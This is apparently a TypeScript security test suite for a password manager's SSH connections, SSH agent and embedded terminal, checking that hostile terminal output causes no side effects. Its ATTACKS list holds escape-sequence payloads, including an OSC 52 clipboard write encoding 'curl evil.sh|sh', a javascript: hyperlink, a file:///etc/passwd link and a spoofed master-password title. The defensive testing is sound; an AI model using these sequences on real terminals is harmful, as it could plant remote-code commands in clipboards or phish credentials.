import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { chromium } from 'playwright';
import { goTest, recordGoTests } from '../lib/gotest';
import { ROOT } from '../lib/paths';
import type { Suite } from '../lib/suite';
import { which } from '../lib/util';

const NAMES: Record<string, string> = {
  TestUnknownHostKeyTrustThenShell: 'Unknown host key: shown for confirmation, trusted only after explicit approval',
  TestUnknownHostKeyReject: 'Unknown host key rejected by the user → connection closed, nothing sent',
  TestHostKeyDecisionTimeout: 'No host-key decision → connection aborted after the timeout',
  TestHostKeyMismatchAbortsBeforeAuth: 'Host-key mismatch aborts BEFORE any credential is sent',
  TestJumpHostBothHopsVerified: 'Jump host: both hops are host-key verified',
  TestJumpHostMismatchAborts: 'Jump host: a mismatch on either hop aborts',
  TestWrongPassword: 'Wrong password fails cleanly',
  TestPublicKeyWithPassphrase: 'Key with passphrase: wrong passphrase refused, right one works',
  TestKeyboardInteractiveMultiPrompt: 'Keyboard-interactive (OTP) prompts are relayed to the user',
  TestKeyboardInteractiveCancel: 'Cancelling an interactive prompt aborts the connection',
  TestRemoteExit: 'Remote exit closes the session and frees resources',
  TestCloseAllNoGoroutineLeak: 'Closing all sessions leaks no goroutines',
  TestAgentAuthUsesHelperKeys: 'SSH auth through the PassVault agent uses only helper-held keys',
  TestSSHTest: 'Connection test performs host-key verification',
  TestAgentSignFlowOverIPC: 'Agent signature requests are approved per use over IPC',
  TestSocketPermissions: 'Agent socket is 0600 inside a 0700 directory',
  TestStopRemovesSocketAndStaleSocketReplaced: 'Stopping removes the socket; a stale socket is replaced safely',
  TestListOnlyWhenUnlocked: 'Agent lists keys only while the vault is unlocked',
  TestSignApprovalDenyOnceTimed: 'Per-use approval: deny, allow once, allow for a limited time',
  TestSignTimeoutDenies: 'Unanswered signature requests are denied',
  TestLockDeniesPending: 'Locking denies pending signature requests',
  TestMutationsRefused: 'Agent refuses add/remove/lock requests from clients (keys cannot be exported or injected)',
  TestSessionBind: 'Forwarded-agent requests (session-bind) are refused',
  TestRealSSHAuthThroughAgent: 'Real OpenSSH authentication through the agent works end to end',
  TestGenerateAndInspectAllAlgorithms: 'Key generation and inspection for all algorithms',
  TestInspectRejects: 'Malformed / unsupported key material is rejected',
  TestScriptOnlyQuotedArgsNoSecrets: 'External terminal: script contains only quoted, validated arguments and no secrets',
  TestRefusesWithoutTrustedKeys: 'External terminal refuses hosts without verified host keys',
  TestRejectsInjection: 'External terminal rejects injection-shaped parameters',
  TestCleanupWhenNeverStarted: 'External terminal temp files are removed if the session never starts',
};

const ATTACKS: Array<[string, string]> = [
  ['OSC 52 clipboard write', '\x1b]52;c;' + Buffer.from('curl evil.sh|sh').toString('base64') + '\x07'],
  ['OSC 8 javascript: hyperlink', '\x1b]8;;javascript:window.__pvterm=1\x07click me\x1b]8;;\x07'],
  ['OSC 8 file: hyperlink', '\x1b]8;;file:///etc/passwd\x07passwd\x1b]8;;\x07'],
  ['title change', '\x1b]0;PassVault — enter your master password\x07'],
  ['DCS / XTGETTCAP probe', '\x1bP+q544e\x1b\\'],
  ['DECRQSS echo-back', '\x1bP$qm\x1b\\'],
  ['window manipulation', '\x1b[2t\x1b[9;1t\x1b[21t'],
  ['plain text URL', 'see https://example.com/login?next=x and javascript:alert(1)'],
];

const suite: Suite = {
  id: 'ssh',
  title: 'SSH connections, host keys, terminal output and SSH agent',
  needsApi: false,
  async run({ t }) {
    if (!which('go')) {
      t.unverified('ssh.go', 'SSH / agent / external-terminal tests (Go)', 'Go toolchain not installed');
    } else {
      const r = goTest(['./internal/sshconn/...', './internal/agentsrv/...', './internal/term/...', './internal/sshkeys/...']);
      recordGoTests(t, 'ssh.go', r!.results, (n) => NAMES[n] ?? n);
    }

    await t.check('ssh.terminal.config', 'Embedded terminal: no clipboard (OSC 52) addon, no proposed APIs, links only http(s) and only after confirmation', () => {
      const src = readFileSync(join(ROOT, 'apps/desktop/src/terminal/xterm-host.ts'), 'utf8');
      const ok = !/ClipboardAddon|addon-clipboard/.test(src) && /allowProposedApi: false/.test(src) && /allowNonHttpProtocols: false/.test(src) && /openLink/.test(src);
      return { ok, evidence: 'xterm-host.ts: allowProposedApi false; no clipboard addon; OSC 8 linkHandler with allowNonHttpProtocols false; plain-text links → openLink → openExternalConfirmed (http/https only, user confirmation)' };
    }, { severity: 'high' });

    await t.check('ssh.terminal.malicious-output', 'Hostile terminal output (OSC 52, OSC 8 javascript:/file:, title, DCS, window ops) causes no clipboard write, navigation, script or link activation', async () => {
      const xtermJs = join(ROOT, 'apps/desktop/node_modules/@xterm/xterm/lib/xterm.js');
      const linksJs = join(ROOT, 'apps/desktop/node_modules/@xterm/addon-web-links/lib/addon-web-links.js');
      const browser = await chromium.launch();
      try {
        const page = await browser.newPage();
        await page.setContent('<!doctype html><title>terminal-test</title><div id="t" style="width:800px;height:400px"></div>');
        await page.addScriptTag({ path: xtermJs });
        await page.addScriptTag({ path: linksJs });
        await page.evaluate(`(() => {
          window.__events = [];
          Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (x) => { window.__events.push('clipboard:' + x); }, write: async () => { window.__events.push('clipboard:write'); } } });
          document.execCommand = (c) => { window.__events.push('execCommand:' + c); return false; };
          window.open = (u) => { window.__events.push('window.open:' + u); return null; };
          const opened = (u) => window.__events.push('openLink:' + u);
          const term = new Terminal({ allowProposedApi: false, linkHandler: { activate: (_e, uri) => opened(uri), allowNonHttpProtocols: false } });
          term.loadAddon(new WebLinksAddon.WebLinksAddon((_e, uri) => opened(uri)));
          term.onData((d) => window.__events.push('reply:' + JSON.stringify(d)));
          term.open(document.getElementById('t'));
          window.__term = term;
        })()`);
        for (const [, seq] of ATTACKS) await page.evaluate((s) => new Promise<void>((res) => (window as unknown as { __term: { write(d: string, cb: () => void): void } }).__term.write(s + '\r\n', res)), seq);
        await page.waitForTimeout(300);
        const events = (await page.evaluate('window.__events')) as string[];
        const flag = await page.evaluate('window.__pvterm ?? null');
        const title = await page.title();
        const bad = events.filter((e) => /^(clipboard|window\.open|openLink|execCommand):/.test(e));
        // Replies to queries (DA/DECRQSS/size reports) go back to the remote host only; record them for review.
        const replies = events.filter((e) => e.startsWith('reply:'));
        return {
          ok: bad.length === 0 && flag === null && title === 'terminal-test',
          evidence: `${ATTACKS.length} hostile sequences written; privileged effects: ${bad.join(', ') || 'none'}; script flag: ${flag}; page title unchanged: ${title === 'terminal-test'}; auto-replies sent back to the server: ${replies.length ? replies.join(' ') : 'none'}`,
        };
      } finally {
        await browser.close();
      }
    }, { severity: 'high' });

    t.notApplicable('ssh.secrets-in-argv', 'SSH secrets in process arguments', 'app-managed sessions use golang.org/x/crypto/ssh in-process (no ssh binary); external Terminal sessions: see ssh.go.term.TestScriptOnlyQuotedArgsNoSecrets');
    t.notApplicable('ssh.agent-destination', 'Agent identifies the destination host', 'by design the agent cannot reliably know the destination; the approval prompt shows a verified host-key fingerprint only when OpenSSH sends session-bind data, and forwarded requests are refused (documented in DESKTOP.md)');
  },
};

export default suite;
